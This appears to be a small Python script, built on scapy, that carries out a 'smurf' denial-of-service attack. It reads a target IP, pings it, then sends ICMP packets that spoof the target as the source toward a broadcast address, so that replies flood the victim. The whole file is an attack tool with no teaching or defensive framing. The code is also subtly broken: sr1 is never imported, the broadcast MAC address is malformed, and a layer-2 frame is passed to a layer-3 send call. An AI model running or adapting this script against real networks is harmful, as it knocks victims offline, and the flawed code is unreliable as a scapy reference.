from scapy.all import send,Ether,IP,ICMP
import sys

target=input('Enter the IP address of target')
ping=IP(dst=target)/ICMP()
ans=sr1(ping,timeout=5,verbose=False)

if ans==None:
	print('Target is not reachable!')
	sys.exit()

def smurf(target):
	pkt=Ether(dst='ff:ff:ff:ff:ff')/IP(src=target)/ICMP()
	try:
		send(pkt)
		print('Packet sent sucessfully')
	except Exception as e:
		print('An error occured while sending the packet')
		print(e)

	


smurf(target)
